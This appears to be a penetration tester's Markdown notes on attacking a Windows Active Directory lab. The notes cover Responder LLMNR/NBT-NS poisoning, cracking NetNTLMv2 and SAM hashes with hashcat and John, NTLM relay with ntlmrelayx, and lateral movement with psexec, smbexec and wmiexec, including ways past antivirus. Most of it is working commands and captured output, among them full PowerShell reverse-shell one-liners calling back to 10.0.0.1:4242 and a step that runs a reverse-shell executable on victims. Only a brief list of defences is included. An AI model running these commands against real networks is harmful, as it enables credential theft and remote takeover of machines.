# Responder 
## NBT-NS/LLMNR Responder

This tool is first an LLMNR and NBT-NS responder, it will answer to *specific* NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409). By default, the tool will only answers to File Server Service request, which is for SMB. The concept behind this, is to target our answers, and be stealthier on the network. This also helps to ensure that we don’t break legitimate NBT-NS behavior. You can set the -r option to 1 via command line if you want this tool to answer to the Workstation Service request name suffix.

```
root@kali:~# responder -h
Usage: python /usr/bin/responder -i 10.20.30.40 -b On -r On

Options:
-h, --help show this help message and exit
-A, --analyze Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests from which workstation to
which workstation without poisoning anything.
-i 10.20.30.40, --ip=10.20.30.40
The ip address to redirect the traffic to. (usually
yours)
-I eth0, --interface=eth0
Network interface to use
-b Off, --basic=Off Set this to On if you want to return a Basic HTTP
authentication. Off will return an NTLM
authentication.This option is mandatory.
-r Off, --wredir=Off Set this to enable answers for netbios wredir suffix
queries. Answering to wredir will likely break stuff
on the network (like classics 'nbns spoofer' will).
Default value is therefore set to Off
-f Off, --fingerprint=Off
This option allows you to fingerprint a host that
issued an NBT-NS or LLMNR query.
-w On, --wpad=On Set this to On or Off to start/stop the WPAD rogue
proxy server. Default value is Off
-F Off, --ForceWpadAuth=Off
Set this to On or Off to force NTLM/Basic
authentication on wpad.dat file retrieval. This might
cause a login prompt in some specific cases. Default
value is Off
--lm=Off Set this to On if you want to force LM hashing
downgrade for Windows XP/2003 and earlier. Default
value is Off
-v More verbose
responder Usage Example

Specify the IP address to redirect to (-i 192.168.1.202), enabling the WPAD rogue proxy (-w On), answers for netbios wredir (-r On), and fingerprinting (-f On):
```

## Usage Example
```
root@kali:~# responder -i 192.168.1.202 -w On -r On -f On
NBT Name Service/LLMNR Responder 2.0.
Please send bugs/comments to: lgaffie@trustwave.com
To kill this script hit CRTL-C

[+]NBT-NS &amp; LLMNR responder started
[+]Loading Responder.conf File..
Global Parameters set:
Responder is bound to this interface:ALL
Challenge set is:1122334455667788
WPAD Proxy Server is:ON
WPAD script loaded:function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}
HTTP Server is:ON
HTTPS Server is:ON
SMB Server is:ON
SMB LM support is set to:OFF
SQL Server is:ON
FTP Server is:ON
IMAP Server is:ON
POP3 Server is:ON
SMTP Server is:ON
DNS Server is:ON
LDAP Server is:ON
FingerPrint Module is:ON
Serving Executable via HTTP&amp;WPAD is:OFF
Always Serving a Specific File via HTTP&amp;WPAD is:OFF
```

## Responder Capture:
```
sudo responder -I eth0 -rdwv                                                                                         1 ⨯
[sudo] password for kali: 
\                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.1.44]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-ZCWKEUFD2NR]
    Responder Domain Name      [FPLT.LOCAL]
    Responder DCE-RPC Port     [45828]

[+] Listening for events...                                                                                                  

[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name DESKTOP-O1NFRBF.local
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name DESKTOP-O1NFRBF.local
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name DESKTOP-O1NFRBF.local
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name spczydbl.local
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name lbflguzsoq.local
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name tlzuqrduak.local
[HTTP] Sending NTLM authentication request to 192.168.1.36
[HTTP] Sending NTLM authentication request to 192.168.1.36
[HTTP] Sending NTLM authentication request to 192.168.1.36
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name DESKTOP-O1NFRBF.local
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name ntrwtaw.local
[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name JTYLUSIFQURZUU (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name xwjexypadtzw.local
[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name NTRWTAW (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name XWJEXYPADTZW (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name jtylusifqurzuu.local
[HTTP] Sending NTLM authentication request to 192.168.1.36
[HTTP] Sending NTLM authentication request to 192.168.1.36
[HTTP] Sending NTLM authentication request to 192.168.1.36
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name bjinrrnb.local
[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name BJINRRNB (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name fkvostnszdjw.local
[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name FKVOSTNSZDJW (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name rlwyxkh.local
[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name RLWYXKH (service: Workstation/Redirector)
[HTTP] Sending NTLM authentication request to 192.168.1.36
[HTTP] Sending NTLM authentication request to 192.168.1.36
[HTTP] Sending NTLM authentication request to 192.168.1.36
[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name DESKTOP-O1NFRBF.local
[SMB] NTLMv2-SSP Client   : 192.168.1.40
[SMB] NTLMv2-SSP Username : MARVEL\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::MARVEL:fa0dbe56d41c12c4:EADD45ECF791E71EA94D597D9A54EF98:0101000000000000007C4489E277D7014A3C1FC269108B450000000002000800460050004C00540001001E00570049004E002D005A00430057004B00450055004600440032004E00520004003400570049004E002D005A00430057004B00450055004600440032004E0052002E00460050004C0054002E004C004F00430041004C0003001400460050004C0054002E004C004F00430041004C0005001400460050004C0054002E004C004F00430041004C0007000800007C4489E277D701060004000200000008003000300000000000000000000000003000007DA804CBE1186A4144C0F6B84C3D34BBF02DEC5875E917BD7FE1F378B40843A50A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E0031002E0034003400000000000000000000000000 
```

# Attacking:
### Data Store:
```
%SystemRoot%\NTDS\Ntds.dit
C:\Windows\NTDS\Ntds.dit
```
always check for this file and grab it. only accessible through the domian controller and contains everything in Active Directory. 


# LLMNR Poisoning: 
#### Responder:
gather hashes over the network passively 
```
sudo python /usr/share/responder/Responder.py -I eth0 -rdw -v 
```
```
-I interface
-r enable answers for netbios wredir suffix queries
-d enable answers for netbios domain suffix queries
-w start the WPAD rogue proxy server
-v verbose
```
save hashses to file called hashes.txt

## Hashcat:
using the password file rockyou.txt and the NTLM module to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```
using the password file rockyou.txt to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```

$ hashcat --help | grep SHA

```
   5500 | NetNTLMv1                                        | Network Protocols
   5500 | NetNTLMv1+ESS                                    | Network Protocols
   5600 | NetNTLMv2                                        | Network Protocols
   1000 | NTLM                                             | Operating Systems
   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
    100 | SHA1                                             | Raw Hash
  17400 | SHA3-256                                         | Raw Hash
  17500 | SHA3-384                                         | Raw Hash
  17600 | SHA3-512                                         | Raw Hash
```
### OUTPUT:
```
hashcat -m 5600 hashes.txt passwords.txt --force
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, 6337/6401 MB (2048 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

INFO: Removed 1 hash found in potfile.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: passwords.txt
* Passwords.: 5
* Bytes.....: 41
* Keyspace..: 5

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

PPARKER::MARVEL:abd8996fdc62d49e:7d7620fa7e88954ec8421d26f071f9ee:010100000000000052fde297a177d701a7ef1960cf99e37700000000020008003100340035004d0001001e00570049004e002d0037004d004d005900380038004400490051004700580004003400570049004e002d0037004d004d00590038003800440049005100470058002e003100340035004d002e004c004f00430041004c00030014003100340035004d002e004c004f00430041004c00050014003100340035004d002e004c004f00430041004c0008003000300000000000000000000000003000006fbf0641ae8081eadf6d920dadef058df615773394bc78a6a5676b0f47fb4a510a00100000000000000000000000000000000000090040005200500043002f00570049004e002d0037004d004d00590038003800440049005100470058002e004d0041005200560045004c002e006c006f00630061006c000000000000000000:Password2
                                                 
Session..........: hashcat
Status...........: Exhausted
Hash.Name........: NetNTLMv2
Hash.Target......: hashes.txt
Time.Started.....: Tue Jul 13 12:37:01 2021, (0 secs)
Time.Estimated...: Tue Jul 13 12:37:01 2021, (0 secs)
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14475 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 2/3 (66.67%) Digests, 2/3 (66.67%) Salts
Progress.........: 15/15 (100.00%)
Rejected.........: 0/15 (0.00%)
Restore.Point....: 5/5 (100.00%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Password1 -> 

Started: Tue Jul 13 12:37:00 2021
Stopped: Tue Jul 13 12:37:03 2021

```
### OF NOTE:
at the end of the hash it now shows the users actual password. 
```
PPARKER::MARVEL:abd8996fdc62d49e:7d7620fa7e88954ec8421d26f071f9ee:010100000000000052fde297a177d701a7ef1960cf99e37700000000020008003100340035004d0001001e00570049004e002d0037004d004d005900380038004400490051004700580004003400570049004e002d0037004d004d00590038003800440049005100470058002e003100340035004d002e004c004f00430041004c00030014003100340035004d002e004c004f00430041004c00050014003100340035004d002e004c004f00430041004c0008003000300000000000000000000000003000006fbf0641ae8081eadf6d920dadef058df615773394bc78a6a5676b0f47fb4a510a00100000000000000000000000000000000000090040005200500043002f00570049004e002d0037004d004d00590038003800440049005100470058002e004d0041005200560045004c002e006c006f00630061006c000000000000000000:Password2 
```
### LLMNR Poisoning Defense:
1. Disable LLMNR
2. Disable NBT-NS
3. Require Network Access Control
4. Require strong passwords (phrases) more than 14 characters


# SMB attacks: How do I get Victim to try connecting to attack machine SMB??
edit: /usr/share/responder/Responder.conf
```
SMB = Off
HTTP = Off
```
everything else stays on

#### NMAP
check for open SMB port and check for SMB signing
```
sudo nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
```
look for smb2 enabled but not required (default for desktops)

### ntmlrelayx.py
1. installed with impacket
2. run while responder is running
```
ntmlrelayx.py -tf targets.txt -smb2support -i
```
Note: targets.txt contains the IP addresses of who we want to attack. without this it won't respond to your attempts. 

```
-i interact (gives you the option to open an SMB shell if ntlmrelayx is able to connect)
-e example.exe: execute example.exe
-c ls: run command ls
```
#### Execute Example:
assuming reverseshell.exe is a file on you attack machine that you want the victim to run
```
ntmlrelayx.py -tf targets.txt -smb2support -e reverseshell.exe
```

#### Command Example:
the command will run on the victim machine
```
ntmlrelayx.py -tf targets.txt -smb2support -c "whoami"

ntmlrelayx.py -tf targets.txt -smb2support -c 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'

ntmlrelayx.py -tf targets.txt -smb2support -c 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

looking for it to dump SAM hashes or give you and SMB client shell for the known user. can use MSFvenom to create an executable payload and get reverse shell. or create a powershell script or CMD to run as a command to get a reverse shell or do something. 

### Interactive Shell:
```
[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from MARVEL/ADMINISTRATOR@192.168.1.40 controlled, attacking target smb://192.168.1.40
[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
[-] Authenticating against smb://192.168.1.40 as MARVEL/ADMINISTRATOR FAILED
[*] SMBD-Thread-5: Connection from MARVEL/ADMINISTRATOR@192.168.1.40 controlled, attacking target smb://192.168.1.43
[*] Authenticating against smb://192.168.1.43 as MARVEL/ADMINISTRATOR SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```
### Connect to the SMB shell: 
```
nc 127.0.0.1 11000
```
hint: use 'help' for a list of SMB shell commands

```
$ nc 127.0.0.1 11000                                                                                                 130 ⨯
Type help for list of commands
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)

# 
```

### Hashes:
```
[*] Authenticating against smb://192.168.1.43 as MARVEL/FCASTLE SUCCEED
[*] SMBD-Thread-19: Connection from MARVEL/FCASTLE@192.168.1.42 controlled, attacking target smb://192.168.1.42
[-] Authenticating against smb://192.168.1.42 as MARVEL/FCASTLE FAILED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] SMBD-Thread-22: Connection from MARVEL/FCASTLE@192.168.1.42 controlled, attacking target smb://192.168.1.36
[*] Target system bootKey: 0x705fc4cbfe6a57a24c6e40e6ea2bffa5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:15a0d85d93a57674f41c8a373ce9174c:::
pete:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 192.168.1.43
[*] Stopping service RemoteRegistry
```

## Crack the Hash with John the Ripper
for cracking the SAM hashes from above
```
john hash.txt -format=nt2 -users=Administrator
cd .john
cat john.pot
```

```
john hash.txt 
john --show hash.txt  
```


#### connecting: requires having cracked a hash
1. can use MSFconsole to attack the tartget using exploit/windows/smb/psexec
2. if that is getting stopped by antivirus try psexec.py 
``` psexec.py <domain>.local/<user>:<password>@<ip-address> ```
3. if that is getting stopped by antivirus try smbexec.py 
``` smbexec.py <domain>.local/<user>:<password>@<ip-address> ```
4. if that is getting stopped by antivirus try wmiexec.py 
``` wmiexec.py <domain>.local/<user>:<password>@<ip-address> ```
5. there is also a powershell version of psexec and other options that might be able to do the same thing. 
